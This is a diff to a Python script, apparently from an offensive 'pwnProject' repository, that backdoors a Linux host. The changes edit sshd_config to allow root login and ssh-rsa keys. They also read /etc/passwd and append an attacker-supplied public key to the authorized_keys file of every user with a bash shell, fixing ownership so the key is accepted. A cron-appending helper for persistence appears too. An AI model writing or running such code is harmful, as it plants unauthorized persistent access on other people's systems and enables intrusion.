@@ -1,5 +1,6 @@
 import os
 import subprocess
+import time
 
 mainUser = 'LivvidDreams'
 scriptLink = 'https://raw.githubusercontent.com/LivvidDreams/pwnProject/master/'
@@ -23,15 +24,19 @@ def sshConfigEdit():
     path = "/etc/ssh/sshd_config"
     flag1 = "GSSAPIAuthentication"
     flag2 = "GSSAPICleanupCredentials"
+    flag3 = "#PubkeyAuthentication yes"
+    flag4 = "#PermitRootLogin yes"
+    flag5 = "PubkeyAcceptedKeyTypes=+ssh-rsa"
     with open(path, "r") as sshfile:
         newlines = []
-        oldlines = []
         for word in sshfile.readlines():
-            if flag1 in word or flag2 in word: 
-                oldlines.append(word)
+            if flag1 in word or flag2 in word or flag5 in word: continue
+        
+            elif flag3 in word or flag4 in word:
+                newlines.append(word[1:])
             else:
                 newlines.append(word)
-    if not oldlines: return
+    newlines.append("PubkeyAcceptedKeyTypes=+ssh-rsa")
     with open(path, "w") as sshfile:
         for line in newlines:
             sshfile.writelines(line)
@@ -39,28 +44,33 @@ def sshConfigEdit():
 
 def gitKeyPush():
     # runCommand("grep -oE '^[^:]+' /etc/passwd >> users.txt")
-    subprocess.Popen("getent passwd >> temp.txt", shell=True)
-    subprocess.Popen("cut temp.txt -d: -f6 >> users.txt", shell= True)
-    runCommand("rm -f temp.txt")
-
-    allDir = set()
+    subprocess.Popen("cut -f 1,6,7 -d: /etc/passwd >> users.txt", shell= True)
+    time.sleep(1)
+    allDir = {}
     with open("users.txt", "r") as userDIR:
         for dir in userDIR.readlines():
-            # Attempt to open authorized_keys file.
-            # If File Does Not Exist. Make it
-            if dir == '/\n': continue
-            allDir.add(dir[:-1] + "/.ssh")
+            pathShell = dir.split(":")
+            if pathShell[1] == '/': continue
+            if pathShell[2] != '/bin/bash\n': continue
+            allDir[pathShell[0]] = pathShell[1]
     runCommand("rm -f users.txt")
 
 
-    for dir in allDir:
+    for key in allDir.keys():
+        user = key
+        dir = allDir[user] + "/.ssh"
+
         sshAuthorized = dir + "/authorized_keys"
-        runCommand(f'mkdir -p {dir}')
-        runCommand(f'chmod 0700 {dir}')
-        subprocess.Popen(f'cat rsakeys.pub >> {sshAuthorized}', shell = True)
-        runCommand(f'chmod 0600 {sshAuthorized}')
+        runCommand("mkdir -p {}".format(dir))
+        runCommand('chmod 0700 {}'.format(dir))
+        runCommand('chown {}:{} {}'.format(user, user, dir))
+        subprocess.Popen('cat rsakeys.pub >> {}'.format(sshAuthorized), shell = True)
+        time.sleep(0.5)
+        runCommand('chmod 0600 {}'.format(sshAuthorized))
+        runCommand('chown {}:{} {}'.format(user, user, sshAuthorized))
+
     
-    runCommand(f'rm -f {files[2]}')
+    runCommand('rm -f {}'.format(files[2]))
 
 
 
@@ -108,9 +118,9 @@ def appendCron(path, command):
         cronfile.close()
         runCommand("systemctl reload crond.service")
         runCommand("systemctl restart crond.service")
-        print(f'Appended To File {path}')
+        print('Appended To File ', path)
     except:
-        print(f"Failed To Append to File {path}")
+        print("Failed To Append to File ", path)
         return
 
     
